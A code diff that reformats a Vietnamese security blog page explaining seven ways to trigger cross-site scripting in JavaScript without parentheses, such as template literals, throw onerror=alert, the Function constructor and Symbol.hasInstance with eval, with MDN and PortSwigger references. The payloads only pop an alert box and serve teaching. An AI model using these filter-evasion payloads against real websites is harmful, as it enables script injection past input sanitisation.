@@ -1,146 +1,251 @@
-<!DOCTYPE HTML>
+<!DOCTYPE html>
 <html>
-    <head>
-		<!-- Google tag (gtag.js) -->
-		<script async src="https://www.googletagmanager.com/gtag/js?id=G-3NTSMWGK5D"></script>
-		<script>
-		  window.dataLayer = window.dataLayer || [];
-		  function gtag(){dataLayer.push(arguments);}
-		  gtag('js', new Date());
+  <head>
+    <!-- Google tag (gtag.js) -->
+    <script
+      async
+      src="https://www.googletagmanager.com/gtag/js?id=G-3NTSMWGK5D"
+    ></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag() {
+        dataLayer.push(arguments);
+      }
+      gtag("js", new Date());
 
-		  gtag('config', 'G-3NTSMWGK5D');
-		</script>
-        <meta charset="UTF-8">
-        <title>XSS Technique without parentheses</title>
-        <link rel="icon" type="image/png" href="https://asayami.github.io/favicon.png"/>
-        <link rel="stylesheet" href="xss_source/xss_css.css">
-		<link rel="stylesheet" href="https://asayami.github.io/theme/theme.css">
-        <script src="xss_source/xss_js.js"></script>
-        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
-        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" integrity="sha512-Fo3rlrZj/k7ujTnHg4CGR2D7kSs0v4LLanw2qksYuRlEzO+tcaEPQogQ0KaoGN26/zrn20ImR1DfuLWnOo7aBA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
-        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
-        <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
-        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
-        <meta name="description" content="Những bài viết, kinh nghiệm của mình về XSS">
-		<meta name="keywords" content="Hacking, hack, XSS, Cross Site Scripting, Cheat Sheet">
-		<meta name="author" content="Asayami Kurashin">
-        <meta name="viewport" content="width=device-width, initial-scale=1">
-    </head>
-    <body>
-		<div class="snowflakes" aria-hidden="true">
-			<div class="snowflake">❅</div>
-			<div class="snowflake"><img src="https://asayami.github.io/theme/1.png" style="width:24px" class="img-fluid mx-auto d-block responsive_phone"></img></div>
-			<div class="snowflake">❆</div>
-			<div class="snowflake">❄</div>
-			<div class="snowflake"><img src="https://asayami.github.io/theme/2.png" style="width:24px" class="img-fluid mx-auto d-block responsive_phone"></img></div>
-			<div class="snowflake">❅</div>
-			<div class="snowflake">❆</div>
-			<div class="snowflake"><img src="https://asayami.github.io/theme/3.png" style="width:24px" class="img-fluid mx-auto d-block responsive_phone"></img></div>
-			<div class="snowflake">❄</div>
-		</div>
-        <!-- Navigation Bar -->
-        <nav class="navbar navbar-expand-md navbar-dark bg-dark fixed-top">
-            <div class="container-fluid navmain" id="navbar" onscroll="NavScroll()">
-                <script>window.onscroll = NavScroll;</script>
-                <a class="navbar-branch" href="https://asayami.github.io/">
-                    <img src="https://asayami.github.io/transparent-favicon.png" style="width:50px;" class="link"></img>
-                </a>
-                <button class="navbar-toggler ml-auto custom-toggler" type="button" data-toggle="collapse" data-target="#navbarResponsive"  aria-controls="navbarSupportedContent-7" aria-expanded="false" aria-label="Toggle navigation">
-                    <span class="navbar-toggler-icon"></span>
-                </button>
-                <div class="collapse navbar-collapse" id="navbarResponsive">
-                    <ul class="navbar-nav ml-auto">
-						<div class="dropdown-divider"></div>
-                        <li class="nav-item active navitem">
-                            <a href="https://asayami.github.io/">Home
-                                <span class="sr-only">(current)</span>
-                            </a>
-                        </li>
-                        <div class="dropdown-divider"></div>
-                        <li class="nav-item navitem">
-                            <a href="https://asayami.github.io/hacking.html">Hacking</a>
-                        </li>
-						<div class="dropdown-divider"></div>
-						<li class="nav-item navitem">
-                            <a href="https://asayami.github.io/embedded.html" class="link">Embedded</a>
-                        </li>
-                        <div class="dropdown-divider"></div>
-                        <li class="nav-item navitem">
-                            <a href="https://asayami.github.io#aboutanchor">About</a>
-                        </li>
-                        <div class="dropdown-divider"></div>
-                        <li class="nav-item navitem">
-                            <a href="https://asayami.github.io#contactanchor">Contact</a>
-                        </li>
-                    </ul>
-                </div>
-            </div>
-        </nav>
-        <div class="mainPicture"></div>
-		
-		<div class="paragraph">
-			<h1>Một số cách khai thác XSS mà không sử dụng dấu ngoặc đơn ( )</h1>
-			<font color="#009933"><pre><code>
+      gtag("config", "G-3NTSMWGK5D");
+    </script>
+    <meta charset="UTF-8" />
+    <title>XSS Technique without parentheses</title>
+    <link
+      rel="icon"
+      type="image/png"
+      href="https://asayami.github.io/favicon.png"
+    />
+    <link rel="stylesheet" href="xss_source/xss_css.css" />
+    <link rel="stylesheet" href="https://asayami.github.io/theme/theme.css" />
+    <script src="xss_source/xss_js.js"></script>
+    <link
+      rel="stylesheet"
+      href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css"
+      integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm"
+      crossorigin="anonymous"
+    />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"
+      integrity="sha512-Fo3rlrZj/k7ujTnHg4CGR2D7kSs0v4LLanw2qksYuRlEzO+tcaEPQogQ0KaoGN26/zrn20ImR1DfuLWnOo7aBA=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    />
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script
+      src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"
+      integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q"
+      crossorigin="anonymous"
+    ></script>
+    <script
+      src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"
+      integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl"
+      crossorigin="anonymous"
+    ></script>
+    <meta
+      name="description"
+      content="Những bài viết, kinh nghiệm của mình về XSS"
+    />
+    <meta
+      name="keywords"
+      content="Hacking, hack, XSS, Cross Site Scripting, Cheat Sheet"
+    />
+    <meta name="author" content="Asayami Kurashin" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+  </head>
+  <body>
+    <div class="snowflakes" aria-hidden="true">
+      <div class="snowflake">❅</div>
+      <div class="snowflake">
+        <img
+          src="https://asayami.github.io/theme/1.png"
+          style="width: 24px"
+          class="img-fluid mx-auto d-block responsive_phone"
+        />
+      </div>
+      <div class="snowflake">❆</div>
+      <div class="snowflake">❄</div>
+      <div class="snowflake">
+        <img
+          src="https://asayami.github.io/theme/2.png"
+          style="width: 24px"
+          class="img-fluid mx-auto d-block responsive_phone"
+        />
+      </div>
+      <div class="snowflake">❅</div>
+      <div class="snowflake">❆</div>
+      <div class="snowflake">
+        <img
+          src="https://asayami.github.io/theme/3.png"
+          style="width: 24px"
+          class="img-fluid mx-auto d-block responsive_phone"
+        />
+      </div>
+      <div class="snowflake">❄</div>
+    </div>
+    <!-- Navigation Bar -->
+    <nav class="navbar navbar-expand-md navbar-dark bg-dark fixed-top">
+      <div class="container-fluid navmain" id="navbar" onscroll="NavScroll()">
+        <script>
+          window.onscroll = NavScroll;
+        </script>
+        <a class="navbar-branch" href="https://asayami.github.io/">
+          <img
+            src="https://asayami.github.io/transparent-favicon.png"
+            style="width: 50px"
+            class="link"
+          />
+        </a>
+        <button
+          class="navbar-toggler ml-auto custom-toggler"
+          type="button"
+          data-toggle="collapse"
+          data-target="#navbarResponsive"
+          aria-controls="navbarSupportedContent-7"
+          aria-expanded="false"
+          aria-label="Toggle navigation"
+        >
+          <span class="navbar-toggler-icon"></span>
+        </button>
+        <div class="collapse navbar-collapse" id="navbarResponsive">
+          <ul class="navbar-nav ml-auto">
+            <div class="dropdown-divider"></div>
+            <li class="nav-item active navitem">
+              <a href="https://asayami.github.io/"
+                >Home
+                <span class="sr-only">(current)</span>
+              </a>
+            </li>
+            <div class="dropdown-divider"></div>
+            <li class="nav-item navitem">
+              <a href="https://asayami.github.io/hacking.html">Hacking</a>
+            </li>
+            <div class="dropdown-divider"></div>
+            <li class="nav-item navitem">
+              <a href="https://asayami.github.io/embedded.html" class="link"
+                >Embedded</a
+              >
+            </li>
+            <div class="dropdown-divider"></div>
+            <li class="nav-item navitem">
+              <a href="https://asayami.github.io#aboutanchor">About</a>
+            </li>
+            <div class="dropdown-divider"></div>
+            <li class="nav-item navitem">
+              <a href="https://asayami.github.io#contactanchor">Contact</a>
+            </li>
+          </ul>
+        </div>
+      </div>
+    </nav>
+    <div class="mainPicture"></div>
+
+    <div class="paragraph">
+      <h1>Một số cách khai thác XSS mà không sử dụng dấu ngoặc đơn ( )</h1>
+      <pre><a style="color: #009933;"><code>
 1.	alert`1337`
-			</font color="#009933"></pre></code>
-			=> Template Literals (là chuỗi được bao bởi `` thay vì cặp ngoặc kép ngoặc đơn thông thường) có khả năng thực thi
-			script ngay trong dấu backtick, xem thêm tại:
-			<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals">Here</a>
-			<font color="#009933"><pre><code>
+</code></a></pre>
+      => Template Literals (là chuỗi được bao bởi `` thay vì cặp ngoặc kép ngoặc
+      đơn thông thường) có khả năng thực thi script ngay trong dấu backtick, xem
+      thêm tại:
+      <a
+        href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals"
+        >Here</a
+      >
+      <pre><a style="color: #009933;"><code>
 2.	throw onerror=alert,1337
-			</font color="#009933"></pre></code>
-			<p>=> Thông thường đầu vào của throw là string, nhưng chúng ta cũng có thể đưa cả object vào như ví dụ này.
-			Đầu tiên gán function alert cho handler onerror (tương đương gán cho window.onerror=alert), những lần throw sau đó do chạy bị lỗi
-			uncaught, nên truyền phần tử cuối lượt throw đó vào function đã gán (alert ở ví dụ này). Đây là bản cải tiến của onerror=alert;throw'XSS'.</p>
-			<p>Lưu ý:  nếu trigger error thông qua console để test sẽ không được, browser đã chặn một phần việc này. Hãy test thông qua gán
-			script vào file html hoặc sử dụng lệnh sau:</p>
-			<font color="#009933"><pre><code>
+			</code></a></pre>
+      <p>
+        => Thông thường đầu vào của throw là string, nhưng chúng ta cũng có thể
+        đưa cả object vào như ví dụ này. Đầu tiên gán function alert cho handler
+        onerror (tương đương gán cho window.onerror=alert), những lần throw sau
+        đó do chạy bị lỗi uncaught, nên truyền phần tử cuối lượt throw đó vào
+        function đã gán (alert ở ví dụ này). Đây là bản cải tiến của
+        onerror=alert;throw'XSS'.
+      </p>
+      <p>
+        Lưu ý: nếu trigger error thông qua console để test sẽ không được,
+        browser đã chặn một phần việc này. Hãy test thông qua gán script vào
+        file html hoặc sử dụng lệnh sau:
+      </p>
+      <pre><a style="color: #009933;"><code>
 setTimeout(function() { notThere(); }, 0);
-			</font color="#009933"></pre></code>
-			
-			<font color="#009933"><pre><code>
+			</code></a></pre>
+
+      <pre><a style="color: #009933;"><code>
 3.	[].sort.call`${alert}1337` = Array.prototype.sort.call`${alert}1337`
-			</font color="#009933"></pre></code>
-			Calling sort() on non-array objects (hàm Array.prototype.sort.call) xem tại
-			<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/sort#calling_sort_on_non-array_objects">Here (Ở cuối)</a>
-			<br>Xem rõ hơn Template Literals tại
-			<a href="https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses">Here</a>
-			<font color="#009933"><pre><code>
+			</code></a></pre>
+      Calling sort() on non-array objects (hàm Array.prototype.sort.call) xem
+      tại
+      <a
+        href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/sort#calling_sort_on_non-array_objects"
+        >Here (Ở cuối)</a
+      >
+      <br />Xem rõ hơn Template Literals tại
+      <a
+        href="https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses"
+        >Here</a
+      >
+      <pre><a style="color: #009933;"><code>
 function x(){
    alert(arguments[0]);
    alert(arguments[1]);
 }
 x`x${'ale'+'rt(1)'}x`
-			</font color="#009933"></pre></code>
-			Sử dụng hàm x như trên trong link portswigger với `${alert}1337` 
-			<br>=> `` có 2 phần tử ..1337.. và alert()
-			<br>Hàm call nhận vào ...call(..1337.., alert) hay thực chất là sort object ..1337.. theo function so sánh alert(),
-			do đó hàm alert đc thực thi
-			<p>VD với bộ test của docs sort ở link trên: console.log(Array.prototype.sort.call(arrayLike, alert('Chtholly'));</p>
-			<font color="#009933"><pre><code>
+			</code></a></pre>
+      Sử dụng hàm x như trên trong link portswigger với `${alert}1337`
+      <br />=> `` có 2 phần tử ..1337.. và alert() <br />Hàm call nhận vào
+      ...call(..1337.., alert) hay thực chất là sort object ..1337.. theo
+      function so sánh alert(), do đó hàm alert đc thực thi
+      <p>
+        VD với bộ test của docs sort ở link trên:
+        console.log(Array.prototype.sort.call(arrayLike, alert('Chtholly'));
+      </p>
+      <pre><a style="color: #009933;"><code>
 4.	Function`x${'alert\x281337\x29'}x```
-			</font color="#009933"></pre></code>
-			Đọc về constructor Function tại
-			<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function">Here</a>
-			<p>Cặp `` đầu là để viết nội dung function, cặp `` thứ 2 là nội dung của arguments truyền vào khi chạy function, giống như alert`1337`
-			nhưng alert thay vì có sẵn thì khi dùng mới tạo</p>
-			<font color="#009933"><pre><code>
+			</code></a></pre>
+      Đọc về constructor Function tại
+      <a
+        href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function"
+        >Here</a
+      >
+      <p>
+        Cặp `` đầu là để viết nội dung function, cặp `` thứ 2 là nội dung của
+        arguments truyền vào khi chạy function, giống như alert`1337` nhưng
+        alert thay vì có sẵn thì khi dùng mới tạo
+      </p>
+      <pre><a style="color: #009933;"><code>
 5.	'alert\x281337\x29'instanceof{[Symbol['hasInstance']]:eval}
-			</font color="#009933"></pre></code>
-			Đọc về instanceof tại
-			<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/instanceof">Here</a>
-			<p>Symbol.hasInstance = Symbol['hasInstance'] đọc tại
-			<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Symbol/hasInstance">Here</a></p>
-			<p>Theo syntax, trước instanceof là object, sau là constructor</p>
-			<font color="#009933"><pre><code>
+			</code></a></pre>
+      Đọc về instanceof tại
+      <a
+        href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/instanceof"
+        >Here</a
+      >
+      <p>
+        Symbol.hasInstance = Symbol['hasInstance'] đọc tại
+        <a
+          href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Symbol/hasInstance"
+          >Here</a
+        >
+      </p>
+      <p>Theo syntax, trước instanceof là object, sau là constructor</p>
+      <pre><a style="color: #009933;"><code>
 6.	x=new DOMMatrix;matrix=alert;x.a=1337;location='javascript'+':'+x
-			</font color="#009933"></pre></code>
-			Chuyển x sang dạng string sẽ thu được dạng matrix(a,b,c,d,e,f)
-			<font color="#009933"><pre><code>
+			</code></a></pre>
+      Chuyển x sang dạng string sẽ thu được dạng matrix(a,b,c,d,e,f)
+      <pre><a style="color: #009933;"><code>
 7.  x=x=>{throw/**/onerror=alert,1337},toString=x,window+''
-			</font color="#009933"></pre></code>
-			Khai báo function x (xem lại XSS Introduction để hiểu rõ hơn), gán toString bằng x, window+'' sẽ thực thi toString(window) và chạy alert
-
-		</div>
-    </body>
+			</code></a></pre>
+      Khai báo function x (xem lại XSS Introduction để hiểu rõ hơn), gán
+      toString bằng x, window+'' sẽ thực thi toString(window) và chạy alert
+    </div>
+  </body>
 </html>
